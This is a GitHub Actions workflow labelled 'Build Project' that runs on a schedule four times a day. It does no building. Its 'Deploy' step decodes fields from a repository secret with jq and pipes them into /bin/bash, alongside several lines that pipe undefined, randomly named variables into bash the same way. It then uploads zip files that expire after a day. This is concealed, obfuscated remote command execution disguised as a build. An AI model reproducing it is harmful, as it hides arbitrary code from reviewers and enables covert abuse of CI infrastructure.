name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '50 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          rd8: ${{ secrets.rd8 }}
        run: |
          printf '%s' "$rd8" | jq -r .zap945 | /bin/bash
          printf '%s' "$kch56" | jq -r .cpoxj5750 | /bin/bash
          echo $gqnb6359 | jq -r .iave9214 | /bin/bash
          echo $l647 | jq -r .gcz554 | /bin/bash
          printf '%s' "$tfsi73" | jq -r .gdy60 | /bin/bash
          echo $pkxnz4839 | jq -r .lfwt19 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: pRsPdthF
          path: "*.zip"
          retention-days: 1
